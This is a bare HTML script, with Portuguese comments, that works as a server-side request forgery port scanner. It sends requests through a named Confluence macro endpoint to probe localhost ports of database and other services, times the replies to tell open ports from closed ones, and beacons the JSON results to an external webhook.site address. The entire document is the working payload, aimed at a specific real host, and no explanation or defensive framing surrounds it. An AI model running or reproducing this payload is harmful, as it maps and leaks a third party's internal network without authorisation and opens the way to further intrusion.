<script>
var ports = [22, 80, 443, 8080, 3000, 5000, 6379, 27017, 5432, 9200];
var results = [];

ports.forEach(function(port) {
  var start = performance.now();
  
  // Tentar conectar via redirect
  fetch('https://confluence-dialogs.weweave.net/macro-remote?pageId=1212597&url=http://127.0.0.1:' + port + '/&outputType=display')
    .then(function() {
      var time = performance.now() - start;
      results.push({port: port, time: time, status: 'open/filtered'});
    })
    .catch(function() {
      var time = performance.now() - start;
      results.push({port: port, time: time, status: 'closed/error'});
    });
});

// Enviar resultados após 10 segundos
setTimeout(function() {
  new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?scan=' + encodeURIComponent(JSON.stringify(results));
}, 10000);
</script>
